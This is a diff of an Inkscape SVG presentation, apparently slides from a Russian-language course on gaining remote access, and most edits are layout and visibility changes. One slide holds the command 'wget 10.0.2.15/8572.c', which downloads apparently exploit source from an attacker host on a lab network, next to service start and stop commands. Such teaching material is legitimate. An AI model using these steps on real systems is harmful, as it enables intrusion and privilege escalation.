@@ -25,11 +25,11 @@
      borderopacity="1.0"
      inkscape:pageopacity="0.94117647"
      inkscape:pageshadow="2"
-     inkscape:zoom="0.70238611"
-     inkscape:cx="472.6745"
-     inkscape:cy="385.82768"
+     inkscape:zoom="0.99332396"
+     inkscape:cx="504.36717"
+     inkscape:cy="403.69508"
      inkscape:document-units="px"
-     inkscape:current-layer="g10569"
+     inkscape:current-layer="g7202"
      showgrid="true"
      inkscape:window-width="1920"
      inkscape:window-height="1018"
@@ -6429,7 +6429,7 @@
      id="layer1"
      inkscape:groupmode="layer"
      inkscape:label="title"
-     style="display:none">
+     style="display:inline">
     <a
        id="a3034">
       <rect
@@ -6550,7 +6550,7 @@
      inkscape:groupmode="layer"
      id="layer2"
      inkscape:label="master_slide"
-     style="display:inline"
+     style="display:none"
      sodipodi:insensitive="true">
     <rect
        style="fill:#ffffff;fill-opacity:1;fill-rule:evenodd;stroke:#5f7da9;stroke-opacity:1"
@@ -7253,7 +7253,8 @@
      style="display:none"
      inkscape:label="Получение удалённого доступа (продолжение)"
      id="g11026"
-     inkscape:groupmode="layer">
+     inkscape:groupmode="layer"
+     sodipodi:insensitive="true">
     <text
        xml:space="preserve"
        style="font-style:normal;font-weight:normal;line-height:120%;font-family:sans-serif;letter-spacing:0px;word-spacing:0px;display:inline;fill:#1f3c84;fill-opacity:1;stroke:none"
@@ -7904,7 +7905,7 @@
        style="display:inline;opacity:1;fill:#d7e3f4;fill-opacity:1;stroke:#2c5aa0;stroke-width:3.77953;stroke-linecap:square;stroke-linejoin:miter;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1;paint-order:fill markers stroke"
        id="rect7230"
        width="1440"
-       height="80"
+       height="120"
        x="80"
        y="470"
        ry="20"
@@ -7915,30 +7916,35 @@
        x="98.152954"
        y="519.93164"
        id="text7238"><tspan
-         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:36px;line-height:120%;font-family:sans-serif;-inkscape-font-specification:'sans-serif, Normal';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
+         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:36px;line-height:120%;font-family:sans-serif;-inkscape-font-specification:'sans-serif, Normal';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start;fill:#800000"
          sodipodi:role="line"
          x="98.152954"
          y="519.93164"
-         id="tspan7232">sudo service apache2 start</tspan><tspan
+         id="tspan7232">sudo gvm-stop</tspan><tspan
+         style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:36px;line-height:120%;font-family:sans-serif;-inkscape-font-specification:'sans-serif, Normal';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start"
          sodipodi:role="line"
          x="98.152954"
-         y="542.49725"
+         y="563.13165"
+         id="tspan5582">sudo service apache2 start</tspan><tspan
+         sodipodi:role="line"
+         x="98.152954"
+         y="585.69727"
          id="tspan7242" /><tspan
          sodipodi:role="line"
          x="98.152954"
-         y="556.89728"
+         y="600.09729"
          id="tspan7234" /><tspan
          id="tspan7236"
          sodipodi:role="line"
          x="98.152954"
-         y="571.29724" /></text>
+         y="614.49725" /></text>
     <text
        id="text7246"
-       y="621.80609"
+       y="661.80609"
        x="76.641235"
        style="font-style:normal;font-weight:normal;line-height:120%;font-family:sans-serif;letter-spacing:0px;word-spacing:0px;display:inline;fill:#1f3c84;fill-opacity:1;stroke:none"
        xml:space="preserve"><tspan
-         y="621.80609"
+         y="661.80609"
          x="76.641235"
          sodipodi:role="line"
          style="font-size:36px;line-height:120%;font-family:sans-serif"
@@ -7946,7 +7952,7 @@
     <rect
        rx="20.000006"
        ry="20"
-       y="650"
+       y="690"
        x="80"
        height="80"
        width="1440"
@@ -7954,24 +7960,24 @@
        style="display:inline;opacity:1;fill:#d7e3f4;fill-opacity:1;stroke:#2c5aa0;stroke-width:3.77953;stroke-linecap:square;stroke-linejoin:miter;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1;paint-order:fill markers stroke" />
     <text
        id="text7258"
-       y="699.93164"
+       y="739.93164"
        x="98.152954"
        style="font-style:normal;font-weight:normal;line-height:120%;font-family:sans-serif;letter-spacing:0px;word-spacing:0px;display:inline;fill:#1f3c84;fill-opacity:1;stroke:none"
        xml:space="preserve"><tspan
          id="tspan7250"
-         y="699.93164"
+         y="739.93164"
          x="98.152954"
          sodipodi:role="line"
          style="font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-size:36px;line-height:120%;font-family:sans-serif;-inkscape-font-specification:'sans-serif, Normal';font-variant-ligatures:normal;font-variant-caps:normal;font-variant-numeric:normal;font-feature-settings:normal;text-align:start;writing-mode:lr-tb;text-anchor:start">wget 10.0.2.15/8572.c</tspan><tspan
          id="tspan7252"
-         y="722.49725"
+         y="762.49725"
          x="98.152954"
          sodipodi:role="line" /><tspan
          id="tspan7254"
-         y="736.89728"
+         y="776.89728"
          x="98.152954"
          sodipodi:role="line" /><tspan
-         y="751.29724"
+         y="791.29724"
          x="98.152954"
          sodipodi:role="line"
          id="tspan7256" /></text>
